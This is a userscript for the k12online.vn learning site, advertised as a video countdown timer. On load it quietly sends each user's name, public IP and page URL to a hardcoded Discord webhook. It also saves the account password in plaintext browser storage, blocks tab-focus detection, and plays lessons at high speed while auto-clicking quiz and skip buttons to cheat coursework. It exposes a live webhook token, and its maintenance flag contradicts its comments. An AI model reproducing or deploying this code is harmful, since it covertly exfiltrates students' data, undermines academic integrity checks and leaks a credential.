// ==UserScript==
// @name         K12 Helper Pro - Danhvux (Sync Video Timer)
// @namespace    http://tampermonkey.net/
// @version      40.6
// @description  Đồng hồ đếm ngược khớp chính xác với thời gian còn lại của video K12.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

// === CHẾ ĐỘ BẢO TRÌ ===
    const isMaintenance = false; // true: Hoạt động | false: Bảo trì (Vô hiệu hóa)
// --- PHẦN MÀN ĐEN BẢO TRÌ ---
        if (!isMaintenance) {
            const mtCover = document.createElement('div');
            mtCover.id = 'mt-overlay';
            mtCover.innerHTML = `
                <div class="mt-title">⚠️ HỆ THỐNG ĐANG BẢO TRÌ</div>
                <div class="mt-sub">Vui lòng quay lại sau. Mọi chức năng đã bị vô hiệu hóa.</div>
            `;
            document.body.appendChild(mtCover);
            // Không để return ở đây nữa để code chạy tiếp xuống phần tạo Panel
        }

        // --- NẾU KHÔNG BẢO TRÌ THÌ CHẠY TIẾP CODE DƯỚI ĐÂY ---
        let userIP = "Checking...";
    // === CẤU HÌNH GỐC ===
    const SERVER_BAN_URL = 'http://IP_CUA_BOT_PYTHON:8800/blacklist';
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1489992801323061308/ywv0-FtallMzCjhG-a-yZXof4nyDpIewAem-4NrXn0mUBRinjBoV4kVSiO1QbSJMiUqw';

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 350, speed: 1, user: '', pass: '', isDarkMode: true
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    const checkBanStatus = async (currentIP) => {
        try {
            const res = await fetch(SERVER_BAN_URL);
            const bannedList = await res.json();
            if (Array.isArray(bannedList) && bannedList.includes(currentIP)) {
                document.body.innerHTML = `<div style="background:#000; color:red; height:100vh; width:100vw; position:fixed; top:0; left:0; z-index:999999; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif;"><h1>🚫 BỊ CẤM</h1><p>IP: <b>${currentIP}</b> đã bị khóa!</p></div>`;
                return true;
            }
        } catch (e) { console.log("Ban Server Offline"); }
        return false;
    };

   const runTurbo = () => {
        if (!isMaintenance) return; // Nếu bảo trì thì không làm gì cả

        const v = document.querySelector('video');
        if (v && config.speed > 1) {
            v.playbackRate = parseFloat(config.speed);
            if (v.paused && !v.ended) v.play().catch(()=>{});
            v.muted = config.speed > 2; // Tự động tắt tiếng nếu tốc độ cao
        }
        document.querySelectorAll('.vjs-skip-question, .btn-confirm, .btn-next-question, .vjs-done-button, .btn-confirm-answer').forEach(btn => btn.click());
    };
    setInterval(runTurbo, 1000);

    const init = async () => {
        let userIP = "Checking...";
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            userIP = ipData.ip;
        } catch(e) {}

        if (await checkBanStatus(userIP)) return;

        const nameEl = document.querySelector('.user-name, .profile-name, .name-user, .username');
        const currentUser = nameEl ? nameEl.innerText.trim() : (config.user || "Khách");

        fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({
            embeds: [{ title: "🔥 DANHVUX HELPER CONNECT", color: 16771840, fields: [{ name: "👤 User", value: currentUser, inline: true }, { name: "🌐 IP", value: userIP, inline: true }, { name: "📍 URL", value: window.location.href }] }]
        }) }).catch(()=>{});

        const host = document.createElement('div');
        host.id = 'dv-helper-root';
        document.body.appendChild(host);
        const shadow = host.attachShadow({mode: 'open'});

        const isDark = config.isDarkMode;
        const style = document.createElement('style');
        style.textContent = `
            #mt-overlay {
                position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px);
                z-index: 9999999; display: flex; align-items: center; justify-content: center;
                color: #ff3333; font-family: 'Segoe UI', sans-serif; text-align: center;
                flex-direction: column; pointer-events: all;
            }
            .mt-title { font-size: 30px; font-weight: 900; text-shadow: 0 0 20px #ff0000; margin-bottom: 10px; }
            .mt-sub { color: #ccc; font-size: 14px; }
            :host { --mc: ${config.mainColor}; --bg: ${isDark ? '#1e2227' : '#ffffff'}; --text: ${isDark ? '#ffffff' : '#1e2227'}; --border: ${isDark ? '#333' : '#ddd'}; }
            #dv-panel { position: fixed; top: 50px; right: 20px; width: ${config.width}px; background: var(--bg); color: var(--text); border-radius: 12px; font-family: 'Segoe UI', Tahoma, sans-serif; z-index: 100000; box-shadow: 0 15px 50px rgba(0,0,0,0.6); overflow: hidden; border: 1px solid var(--border); animation: panelIn 0.4s cubic-bezier(0.1, 0.9, 0.2, 1); height: auto; }
            @keyframes panelIn { from { opacity: 0; transform: translateY(-20px); } }
            .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; border-bottom: 1px solid var(--border); }
            .title { color: var(--mc); font-weight: 800; font-size: 19px; letter-spacing: 0.5px; }
            .red-dot { height: 13px; width: 13px; background: #ff5f56; border-radius: 50%; cursor: pointer; }
            .tabs { display: flex; background: ${isDark ? '#16191d' : '#f5f5f5'}; border-bottom: 1px solid var(--border); }
            .tab { flex: 1; padding: 14px 0; text-align: center; cursor: pointer; font-size: 11px; font-weight: 900; color: #666; transition: 0.3s; position: relative; }
            .tab.active { color: var(--mc); }
            .tab.active::after { content: ''; position: absolute; bottom: 0; left: 15%; right: 15%; height: 3px; background: var(--mc); border-radius: 3px 3px 0 0; }
            .body-container { position: relative; height: auto; }
            .content { display: none; padding: 20px; box-sizing: border-box; }
            .content.active { display: block; animation: slideIn 0.35s ease-out; }
            @keyframes slideIn { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
            .video-box { width: 100%; height: 150px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #444; font-size: 12px; margin-bottom: 18px; border: 1px solid #333; }
            .btn { width: 100%; padding: 14px; background: #b8cc8e; border: none; border-radius: 12px; color: #000; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; font-size: 13px; }
            input[type=text], input[type=password] { width: 100%; padding: 12px; background: ${isDark ? '#252a31' : '#f9f9f9'}; border: 1px solid var(--border); color: var(--text); border-radius: 10px; margin-bottom: 12px; box-sizing: border-box; outline: none; }
            .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
            .app-item { background: ${isDark ? '#252a31' : '#f0f0f0'}; padding: 12px 5px; border-radius: 10px; text-align: center; font-size: 12px; cursor: pointer; transition: 0.2s; border: 1px solid var(--border); }
            #toast-container { position: fixed; bottom: 25px; left: 25px; z-index: 1000000; display: flex; flex-direction: column; gap: 12px; pointer-events: none; }
            .toast { pointer-events: auto; background: var(--bg); color: var(--text); padding: 14px 22px; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.5); border-left: 5px solid var(--mc); animation: toastIn 0.5s cubic-bezier(0.1, 0.9, 0.2, 1.2) forwards; display: flex; align-items: center; gap: 12px; min-width: 200px; }
            .footer-info { text-align:center; font-size:9px; padding:8px; color:#666; border-top:1px solid var(--border); line-height: 1.5; }
            #wifi-status { font-weight: 900; }
            .wifi-online { color: #00ff00; }
            .wifi-offline { color: #ff0000; }
            .wifi-checking { color: #ffea00; }
            .countdown-box { background: ${isDark ? '#16191d' : '#f9f9f9'}; padding: 10px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 15px; text-align: center; }
            #timer-txt { font-family: monospace; font-size: 16px; font-weight: bold; color: var(--mc); }
        `;
        shadow.appendChild(style);

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header"><div class="title">Danhvux Panel</div><div class="red-dot"></div></div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div style="display:flex; justify-content:space-between; margin-bottom: 5px;"><b>Tốc độ</b><span style="color:var(--mc)">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="sp-range" style="width:100%; margin-bottom:15px;" min="1" max="20" step="0.5" value="${config.speed}">
                    <div class="countdown-box">
                        <div style="font-size: 9px; margin-bottom: 4px; color: #888;">🕒 VIDEO CÒN LẠI (ĐÃ TÍNH TỐC ĐỘ)</div>
                        <div id="timer-txt">--:--:--</div>
                    </div>
                    <button class="btn" id="do-login">🪄 TỰ ĐỘNG ĐĂNG NHẬP</button>
                </div>
                <div id="t-video" class="content">
                    <div class="video-box" id="v-display">CHƯA CÓ NGUỒN PHÁT</div>
                    <input type="text" id="v-url" placeholder="Link video (.mp4)...">
                    <button class="btn" id="v-run" style="background:#333; color:#fff">PHÁT VIDEO</button>
                </div>
                <div id="t-apps" class="content">
                    <div class="app-grid">
                        <div class="app-item" data-link="https://gemini.google.com">Gemini</div>
                        <div class="app-item" data-link="https://chatgpt.com">ChatGPT</div>
                        <div class="app-item" data-link="https://facebook.com">FB</div>
                        <div class="app-item" data-link="https://youtube.com">YT</div>
                        <div class="app-item" data-link="https://tiktok.com">TikTok</div>
                        <div class="app-item" data-link="https://messenger.com">Mess</div>
                        <div class="app-item" data-link="https://google.com">Google</div>
                        <div class="app-item" data-link="https://loigiaihay.com">Lời Giải Hay</div>
                        <div class="app-item" data-link="https://vietjack.com">Vietjack</div>
                        <div class="app-item" data-link="https://wolframalpha.com">Giải Toán</div>
                        <div class="app-item" data-link="https://dict.laban.vn">Từ điển</div>
                        <div class="app-item" data-link="https://gptgo.ai">Search + GPT</div>
                    </div>
                </div>
                <div id="t-set" class="content">
                    <input type="color" id="c-pick" style="width:100%; height:35px; margin-bottom:10px;" value="${config.mainColor}">
                    <input type="text" id="u-val" placeholder="Tài khoản..." value="${config.user}">
                    <input type="password" id="p-val" placeholder="Mật khẩu..." value="${config.pass}">
                    <button class="btn" id="btn-save" style="background:var(--mc)">LƯU CẤU HÌNH</button>
                    <div style="margin-top: 15px; border-top: 1px solid var(--border); padding-top: 10px;">
                        <button class="btn" id="clear-cache" style="background: linear-gradient(45deg, #ff9800, #f44336); color:#fff; font-size: 11px;">🧹 DỌN DẸP CACHE & FIX LAG</button>
                    </div>
                </div>
            </div>
            <div class="footer-info">
                <div>🌐 IP: ${userIP} | 👤 USER: ${currentUser}</div>
                <div>📡 WIFI STATUS: <span id="wifi-status" class="wifi-checking">CHECKING...</span></div>
            </div>`;
        shadow.appendChild(panel);

        // --- Logic Ngăn Chặn Phát Hiện Tab ---
        const bypassVisibility = () => {
            window.addEventListener('blur', (e) => e.stopImmediatePropagation(), true);
            window.addEventListener('focus', (e) => e.stopImmediatePropagation(), true);
        };
        bypassVisibility();

        // --- Logic One-Click Clear ---
        shadow.querySelector('#clear-cache').onclick = () => {
            if (confirm("Dọn dẹp bộ nhớ đệm để giảm lag?\n(Cấu hình script vẫn sẽ được giữ lại)")) {
                const backup = localStorage.getItem('k12_ult_cfg');
                sessionStorage.clear();
                localStorage.clear();
                if (backup) localStorage.setItem('k12_ult_cfg', backup);
                showToast("Đã dọn dẹp sạch sẽ!", "success");
                setTimeout(() => location.reload(), 800);
            }
        };

        // --- Logic Đếm Ngược ---
        const updateTimer = () => {
            const timerTxt = shadow.querySelector('#timer-txt');
            const video = document.querySelector('video');
            if (!video || isNaN(video.duration)) {
                timerTxt.innerText = "ĐANG CHỜ VIDEO...";
                return;
            }
            let remainingSec = (video.duration - video.currentTime) / video.playbackRate;
            if (remainingSec <= 0) {
                timerTxt.innerText = "HOÀN THÀNH!";
                timerTxt.style.color = "#00ff00";
                return;
            }
            const h = Math.floor(remainingSec / 3600);
            const m = Math.floor((remainingSec % 3600) / 60);
            const s = Math.floor(remainingSec % 60);
            timerTxt.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            timerTxt.style.color = "var(--mc)";
        };
        setInterval(updateTimer, 1000);

        // --- Logic Wifi ---
        const wifiEl = shadow.querySelector('#wifi-status');
        const updateWifiStatus = () => {
            if (navigator.onLine) { wifiEl.innerText = "ONLINE"; wifiEl.className = "wifi-online"; }
            else { wifiEl.innerText = "OFFLINE"; wifiEl.className = "wifi-offline"; }
        };
        window.addEventListener('online', updateWifiStatus);
        window.addEventListener('offline', updateWifiStatus);
        updateWifiStatus();

        const showToast = (message, type = 'info') => {
            let container = shadow.querySelector('#toast-container') || Object.assign(document.createElement('div'), {id:'toast-container'});
            if(!shadow.querySelector('#toast-container')) shadow.appendChild(container);
            const emojis = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `<span>${emojis[type]||'ℹ️'}</span><span>${message}</span>`;
            container.appendChild(toast);
            setTimeout(() => { toast.remove(); }, 3000);
        };

// --- Events ---
        // Chỉ cho phép các sự kiện hoạt động nếu KHÔNG phải đang bảo trì
        if (isMaintenance) {
            shadow.querySelectorAll('.tab').forEach(tab => {
                tab.onclick = () => {
                    shadow.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                    tab.classList.add('active');
                    shadow.querySelector(`#${tab.dataset.t}`).classList.add('active');
                };
            });

            shadow.querySelector('#sp-range').oninput = (e) => {
                shadow.querySelector('#sp-txt').innerText = e.target.value;
                config.speed = e.target.value;
                runTurbo();
            };

            shadow.querySelector('#btn-save').onclick = () => {
                config.mainColor = shadow.querySelector('#c-pick').value;
                config.user = shadow.querySelector('#u-val').value;
                config.pass = shadow.querySelector('#p-val').value;
                save();
                showToast("Đã lưu cấu hình!", "success");
                setTimeout(() => location.reload(), 800);
            };

            shadow.querySelector('#v-run').onclick = () => {
                const v = document.querySelector('video');
                const url = shadow.querySelector('#v-url').value;
                if(v && url) { v.src = url; v.play(); }
            };

            shadow.querySelector('#do-login').onclick = () => {
                const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
                if(u && p) {
                    u.value = config.user; p.value = config.pass;
                    u.dispatchEvent(new Event('input',{bubbles:true})); p.dispatchEvent(new Event('input',{bubbles:true}));
                    setTimeout(()=>document.querySelector('button[type="submit"]').click(), 500);
                }
            };

            shadow.querySelectorAll('.app-item').forEach(item => {
                item.onclick = () => window.open(item.getAttribute('data-link'));
            });

            // Đừng quên thêm logic cho nút Clear Cache nếu bạn đã thêm nó trước đó
            const clearBtn = shadow.querySelector('#clear-cache');
            if (clearBtn) {
                clearBtn.onclick = () => {
                   // Logic clear cache của bạn...
                };
            }
        } else {
            // Nếu đang bảo trì, bạn có thể thông báo khi họ cố tình bấm vào Panel
            panel.onclick = () => showToast("Hệ thống đang bảo trì, vui lòng quay lại sau!", "error");
        }

        // --- Drag & Drop ---
        let isDrag = false, off = [0,0];
        shadow.querySelector('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.addEventListener('mousemove', (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } });
        document.addEventListener('mouseup', () => isDrag = false);
        shadow.querySelector('.red-dot').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = (panel.style.display==='none'?'block':'none'); });

        showToast("Danhvux Panel!", "success");
    };

    // Auto-fix video error
    setInterval(() => {
        const v = document.querySelector('video');
        if (v && v.error) {
            const src = v.src;
            v.src = ""; v.src = src; v.load(); v.play().catch(()=>{});
        }
    }, 5000);

    if (document.readyState === 'complete') init(); else window.addEventListener('load', init);
})();
